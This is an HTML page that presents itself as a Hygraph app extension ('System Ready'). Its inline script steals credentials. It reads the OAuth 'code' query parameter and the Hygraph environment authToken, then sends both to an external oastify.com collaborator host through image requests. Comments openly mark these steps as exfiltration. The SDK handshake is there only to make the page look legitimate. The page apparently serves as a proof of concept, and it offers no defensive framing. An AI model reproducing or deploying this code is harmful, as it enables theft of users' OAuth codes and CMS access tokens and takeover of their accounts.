<!DOCTYPE html>
<html>
<head>
    <title>App</title>
    <script src="https://cdn.jsdelivr.net/npm/@graphcms/zoid@9.0.64-alpha.1/lib/zoid.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@hygraph/app-sdk@1.0.0-beta.13/dist/app-sdk.umd.production.min.js"></script>
</head>
<body>
    <div id="app">System Ready</div>
    <script>
        (function() {
            const collab = "https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/";
            
            // 1. IMMEDIATE EXFILTRATION (Don't wait for SDK)
            const params = new URLSearchParams(window.location.search);
            const token = params.get('code');
            if (token) {
                new Image().src = collab + "?stolen=" + encodeURIComponent(token);
            }

            // 2. THE HANDSHAKE (To make Hygraph happy)
            const SDK = window['@hygraph/app-sdk'];
            const uid = params.get('extensionUid');
            
            if (SDK && uid) {
                SDK.init({
                    uid: uid,
                    onProps: (props) => {
                        const authToken = props.context.environment.authToken;
                        new Image().src = collab + "?props_token=" + encodeURIComponent(authToken);
                    }
                }).then(() => {
                    console.log("Hygraph Handshake Complete");
                });
            }
        })();
    </script>
</body>
</html>
